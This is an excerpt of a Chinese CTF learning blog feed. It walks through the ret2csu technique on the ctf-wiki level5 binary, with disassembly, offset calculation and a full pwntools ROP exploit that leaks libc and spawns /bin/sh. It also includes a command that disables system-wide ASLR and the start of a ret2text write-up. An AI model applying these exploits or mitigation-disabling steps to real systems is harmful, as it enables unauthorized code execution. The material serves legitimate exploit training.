src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831122757.png" alt="image.png"></p><p>换了一个ubuntu系统，装了一个conda(python为3.11)，试到第4个，就有结果了<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831210836.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831210653.png" alt="image.png"></p><h2 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/m0_64180167/article/details/130263518?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-130263518-blog-122848031.235%5Ev38%5Epc_relevant_anti_vip_base&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-130263518-blog-122848031.235%5Ev38%5Epc_relevant_anti_vip_base&utm_relevant_index=3"># CTFWIKI-PWN-ret2libc</a> 讲的非常详细<br><a href="https://www.jianshu.com/p/5525dde00053"># pwn学习之ret2libc3——偏移计算初体验</a>   学习了部分技能<br><a href="https://blog.csdn.net/DSR446/article/details/99698035"># 2019.7.25 ret2libc3 填充从112遍为104</a> 学到了可以用setvbuf进行泄露</p><h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><h2 id="二进制下载"><a href="#二进制下载" class="headerlink" title="二进制下载"></a>二进制下载</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5/level5">二进制下载位置</a></p><h2 id="checksec-1"><a href="#checksec-1" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ret2csu]<span class="hljs-comment"># file level5</span><br>level5: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=45a4cee8f6bcc184507b3bea0f0c2e2d603650bd, not stripped <br>[root@ningan ret2csu]<span class="hljs-comment">#</span><br>[root@ningan ret2csu]<span class="hljs-comment"># checksec level5</span><br>[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)<br>[*] <span class="hljs-string">&#x27;/root/ctf/ctfwiki/ret2csu/level5&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br>[root@ningan ret2csu]<span class="hljs-comment">#</span><br>[root@ningan ret2csu]<span class="hljs-comment"># ./level5</span><br>Hello, World<br><span class="hljs-built_in">ls</span><br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831161330.png" alt="image.png"></p><h2 id="查看漏洞溢出点"><a href="#查看漏洞溢出点" class="headerlink" title="查看漏洞溢出点"></a>查看漏洞溢出点</h2><p>溢出点为read函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Hello, World\n&quot;</span>, <span class="hljs-number">0xD</span>uLL);<br>  vulnerable_function();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">128</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-80h] BYREF</span><br><br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x200</span>uLL);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831173326.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831173403.png" alt="image.png"></p><h2 id="libc-csu-init函数"><a href="#libc-csu-init函数" class="headerlink" title="__libc_csu_init函数"></a>__libc_csu_init函数</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230901120732.png" alt="image.png"></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>C0                               <span class="hljs-comment">; void __fastcall _libc_csu_init(unsigned int, __int64, __int64)</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>C0                               public __libc_csu_init<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>C0                               __libc_csu_init proc near               <span class="hljs-comment">; DATA XREF: _start+16↑o</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>C0                               <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>C0 <span class="hljs-number">41</span> <span class="hljs-number">57</span>                         <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r15</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>C2 <span class="hljs-number">41</span> <span class="hljs-number">56</span>                         <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r14</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>C4 <span class="hljs-number">41</span> <span class="hljs-number">89</span> FF                      <span class="hljs-keyword">mov</span>     r15d, edi<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>C7 <span class="hljs-number">41</span> <span class="hljs-number">55</span>                         <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r13</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>C9 <span class="hljs-number">41</span> <span class="hljs-number">54</span>                         <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r12</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>CB <span class="hljs-number">4</span>C <span class="hljs-number">8</span>D <span class="hljs-number">25</span> <span class="hljs-number">3</span>E <span class="hljs-number">08</span> <span class="hljs-number">20</span> <span class="hljs-number">00</span>          lea     <span class="hljs-built_in">r12</span>, __frame_dummy_init_array_entry<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>D2 <span class="hljs-number">55</span>                            <span class="hljs-keyword">push</span>    rbp<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>D3 <span class="hljs-number">48</span> <span class="hljs-number">8</span>D <span class="hljs-number">2</span>D <span class="hljs-number">3</span>E <span class="hljs-number">08</span> <span class="hljs-number">20</span> <span class="hljs-number">00</span>          lea     rbp, __do_global_dtors_aux_fini_array_entry<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>DA <span class="hljs-number">53</span>                            <span class="hljs-keyword">push</span>    rbx<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>DB <span class="hljs-number">49</span> <span class="hljs-number">89</span> F6                      <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r14</span>, rsi<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>DE <span class="hljs-number">49</span> <span class="hljs-number">89</span> D5                      <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r13</span>, rdx<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005E1</span> <span class="hljs-number">4</span>C <span class="hljs-number">29</span> E5                      <span class="hljs-keyword">sub</span>     rbp, <span class="hljs-built_in">r12</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005E4</span> <span class="hljs-number">48</span> <span class="hljs-number">83</span> EC <span class="hljs-number">08</span>                   <span class="hljs-keyword">sub</span>     rsp, <span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005E8</span> <span class="hljs-number">48</span> C1 FD <span class="hljs-number">03</span>                   sar     rbp, <span class="hljs-number">3</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>EC E8 <span class="hljs-number">0</span>F FE FF FF                <span class="hljs-keyword">call</span>    _init_proc<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>EC<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>F1 <span class="hljs-number">48</span> <span class="hljs-number">85</span> ED                      test    rbp, rbp<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>F4 <span class="hljs-number">74</span> <span class="hljs-number">20</span>                         jz      short loc_400616<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>F4<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>F6 <span class="hljs-number">31</span> DB                         xor     ebx, ebx<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>F8 <span class="hljs-number">0</span>F <span class="hljs-number">1</span>F <span class="hljs-number">84</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       <span class="hljs-keyword">nop</span>     dword ptr [rax+rax+<span class="hljs-number">00000000</span>h]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>F8<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400600</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400600</span>                               loc_400600:                             <span class="hljs-comment">; CODE XREF: __libc_csu_init+54↓j</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400600</span> <span class="hljs-number">4</span>C <span class="hljs-number">89</span> EA                      <span class="hljs-keyword">mov</span>     rdx, <span class="hljs-built_in">r13</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400603</span> <span class="hljs-number">4</span>C <span class="hljs-number">89</span> F6                      <span class="hljs-keyword">mov</span>     rsi, <span class="hljs-built_in">r14</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400606</span> <span class="hljs-number">44</span> <span class="hljs-number">89</span> FF                      <span class="hljs-keyword">mov</span>     edi, r15d<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400609</span> <span class="hljs-number">41</span> FF <span class="hljs-number">14</span> DC                   <span class="hljs-keyword">call</span>    ds:(__frame_dummy_init_array_entry - <span class="hljs-number">600E10</span>h)[<span class="hljs-built_in">r12</span>+rbx*<span class="hljs-number">8</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400609</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040060</span>D <span class="hljs-number">48</span> <span class="hljs-number">83</span> C3 <span class="hljs-number">01</span>                   <span class="hljs-keyword">add</span>     rbx, <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400611</span> <span class="hljs-number">48</span> <span class="hljs-number">39</span> EB                      cmp     rbx, rbp<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400614</span> <span class="hljs-number">75</span> EA                         jnz     short loc_400600<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400614</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400616</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400616</span>                               loc_400616:                             <span class="hljs-comment">; CODE XREF: __libc_csu_init+34↑j</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400616</span> <span class="hljs-number">48</span> <span class="hljs-number">83</span> C4 <span class="hljs-number">08</span>                   <span class="hljs-keyword">add</span>     rsp, <span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040061</span>A <span class="hljs-number">5</span>B                            <span class="hljs-keyword">pop</span>     rbx<br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040061</span>B <span class="hljs-number">5</span>D                            <span class="hljs-keyword">pop</span>     rbp<br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040061</span>C <span class="hljs-number">41</span> <span class="hljs-number">5</span>C                         <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">r12</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040061</span>E <span class="hljs-number">41</span> <span class="hljs-number">5</span>D                         <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">r13</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400620</span> <span class="hljs-number">41</span> <span class="hljs-number">5</span>E                         <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">r14</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400622</span> <span class="hljs-number">41</span> <span class="hljs-number">5</span>F                         <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">r15</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400624</span> C3                            retn<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400624</span>                               <span class="hljs-comment">; &#125; // starts at 4005C0</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400624</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400624</span>                               __libc_csu_init endp<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400624</span><br></code></pre></td></tr></table></figure><h2 id="查看漏洞溢出的距离"><a href="#查看漏洞溢出的距离" class="headerlink" title="查看漏洞溢出的距离"></a>查看漏洞溢出的距离</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">b vulnerable_function</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">run</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">n</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">n</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">stack 20</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">distance 0x7fffffffe100 0x7fffffffe180</span><br><span class="hljs-meta prompt_">0x7fffffffe100-&gt;</span><span class="language-bash">0x7fffffffe180 is 0x80 bytes (0x10 words)</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/d 0x80</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">1 = 128</span><br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831173215.png" alt="image.png"></p><h2 id="。。。后期补。。。"><a href="#。。。后期补。。。" class="headerlink" title="。。。后期补。。。"></a>。。。后期补。。。</h2><h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><p>ctfwiki官网题解</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs bash">from pwn import *<br>from LibcSearcher import LibcSearcher<br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>context(<span class="hljs-built_in">arch</span> = <span class="hljs-string">&quot;amd64&quot;</span>)<br><br>level5 = ELF(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>sh = process(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br><br>write_got = level5.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_got = level5.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>main_addr = level5.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>bss_base = level5.bss()<br>csu_front_addr = 0x0000000000400600<br>csu_end_addr = 0x000000000040061A<br>fakeebp = b<span class="hljs-string">&#x27;b&#x27;</span> * 8<br><br><br>def csu(rbx, rbp, r12, r13, r14, r15, last):<br>    <span class="hljs-comment"># pop rbx,rbp,r12,r13,r14,r15</span><br>    <span class="hljs-comment"># rbx should be 0,</span><br>    <span class="hljs-comment"># rbp should be 1,enable not to jump</span><br>    <span class="hljs-comment"># r12 should be the function we want to call</span><br>    <span class="hljs-comment"># rdi=edi=r15d</span><br>    <span class="hljs-comment"># rsi=r14</span><br>    <span class="hljs-comment"># rdx=r13</span><br>    payload = b<span class="hljs-string">&#x27;a&#x27;</span> * 0x80 + fakeebp<br>    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(<br>        r13) + p64(r14) + p64(r15)<br>    payload += p64(csu_front_addr)<br>    payload += b<span class="hljs-string">&#x27;a&#x27;</span> * 0x38<br>    payload += p64(last)<br>    sh.send(payload)<br>    <span class="hljs-built_in">sleep</span>(1)<br><br><br>sh.recvuntil(<span class="hljs-string">&#x27;Hello, World\n&#x27;</span>)<br><span class="hljs-comment">## RDI, RSI, RDX, RCX, R8, R9, more on the stack</span><br><span class="hljs-comment">## write(1,write_got,8)</span><br>csu(0, 1, write_got, 8, write_got, 1, main_addr)<br><br>write_addr = u64(sh.recv(8))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>, write_addr)<br>libc_base = write_addr - libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>execve_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;execve&#x27;</span>)<br>log.success(<span class="hljs-string">&#x27;execve_addr &#x27;</span> + hex(execve_addr))<br><span class="hljs-comment">##gdb.attach(sh)</span><br><br><span class="hljs-comment">## read(0,bss_base,16)</span><br><span class="hljs-comment">## read execve_addr and /bin/sh\x00</span><br>sh.recvuntil(<span class="hljs-string">&#x27;Hello, World\n&#x27;</span>)<br>csu(0, 1, read_got, 16, bss_base, 0, main_addr)<br>sh.send(p64(execve_addr) + b<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><br>sh.recvuntil(<span class="hljs-string">&#x27;Hello, World\n&#x27;</span>)<br><span class="hljs-comment">## execve(bss_base+8)</span><br>csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)<br>sh.interactive()<br><br><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">└─# python exp.py</span><br><span class="hljs-string">[*] &#x27;/root/ctf-practice/ctfwiki/ret2csu/level5&#x27;</span><br><span class="hljs-string">    Arch:     amd64-64-little</span><br><span class="hljs-string">    RELRO:    Partial RELRO</span><br><span class="hljs-string">    Stack:    No canary found</span><br><span class="hljs-string">    NX:       NX enabled</span><br><span class="hljs-string">    PIE:      No PIE (0x400000)</span><br><span class="hljs-string">[+] Starting local process &#x27;./level5&#x27;: pid 219789</span><br><span class="hljs-string">/root/ctf-practice/ctfwiki/ret2csu/exp.py:37: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="hljs-string">  sh.recvuntil(&#x27;Hello, World\n&#x27;)</span><br><span class="hljs-string">[+] There are multiple libc that meet current constraints :</span><br><span class="hljs-string">0 - libc6_2.7-10ubuntu3_i386</span><br><span class="hljs-string">1 - libc-2.28-206.el8.x86_64</span><br><span class="hljs-string">2 - glibc-2.28-206.el8.x86_64</span><br><span class="hljs-string">3 - glibc-2.28-208.el8.x86_64</span><br><span class="hljs-string">4 - libc-2.28-208.el8.x86_64</span><br><span class="hljs-string">5 - glibc-2.28-207.el8.x86_64</span><br><span class="hljs-string">6 - libc-2.36-22.mga9.i586</span><br><span class="hljs-string">7 - libc6_2.37-6_amd64</span><br><span class="hljs-string">8 - libc-2.28-207.el8.x86_64</span><br><span class="hljs-string">9 - libc6_2.7-10ubuntu2_i386</span><br><span class="hljs-string">[+] Choose one : 7</span><br><span class="hljs-string">[+] execve_addr 0x7fb841531060</span><br><span class="hljs-string">/root/ctf-practice/ctfwiki/ret2csu/exp.py:51: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="hljs-string">  sh.recvuntil(&#x27;Hello, World\n&#x27;)</span><br><span class="hljs-string">/root/ctf-practice/ctfwiki/ret2csu/exp.py:55: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="hljs-string">  sh.recvuntil(&#x27;Hello, World\n&#x27;)</span><br><span class="hljs-string">[*] Switching to interactive mode</span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">core  exp-self.py  exp.py  exp2-test.py  exp3-test.py  level5</span><br><span class="hljs-string">$  </span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230901115410.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230901120524.png" alt="image.png"></p><h2 id="参考-3"><a href="#参考-3" class="headerlink" title="参考"></a>参考</h2><p><a href="https://wiki.mrskye.cn/Pwn/stackoverflow/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#level-5-gadget"># 一步一步学ROP之Linux篇 - 学习笔记-level5-通用gadget</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ctf题目系列】自定义</title>
    <link href="/2023/08/21/ctf/unsupported/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91%E8%87%AA%E5%AE%9A%E4%B9%89/"/>
    <url>/2023/08/21/ctf/unsupported/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91%E8%87%AA%E5%AE%9A%E4%B9%89/</url>
    
    <content type="html"><![CDATA[<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">gcc -m32 -fno-stack-protector stack_example.c -o stack_example<br></code></pre></td></tr></table></figure><p><code>-m32</code> 指的是生成 32 位程序； <code>-fno-stack-protector</code> 指的是不开启堆栈溢出保护，即不生成 canary。<br>如果含有<code>--enable-default-pie</code>参数则代表 PIE 默认已开启，需要在编译指令中添加参数<code>-no-pie</code>。<br><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭 Linux 系统的 ASLR</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ctf题目系列】ctfhub pwn类型</title>
    <link href="/2023/08/21/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91ctfhub%20pwn%E7%B1%BB%E5%9E%8B/"/>
    <url>/2023/08/21/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91ctfhub%20pwn%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ret2text顾名思义，即控制返回地址指向程序本身已有的的代码(.text)并执行。</p><h2 id="checksec检查"><a href="#checksec检查" class="headerlink" title="checksec检查"></a>checksec检查</h2><p>检查二进制：64位二进制，有可执行权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ctfhub]<span class="hljs-comment"># checksec pwn</span><br>[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)<br>[*] <span class="hljs-string">&#x27;/root/ctf/ctfhub/pwn&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No PIE (0x400000)<br>    RWX:      Has RWX segments<br><br></code></pre></td></tr></table></figure><h2 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h2><p>main函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> v4[<span class="hljs-number">112</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-70h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to CTFHub ret2text.Input someting:&quot;</span>);<br>  gets(v4);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;bye&quot;</span>);<br>  <span 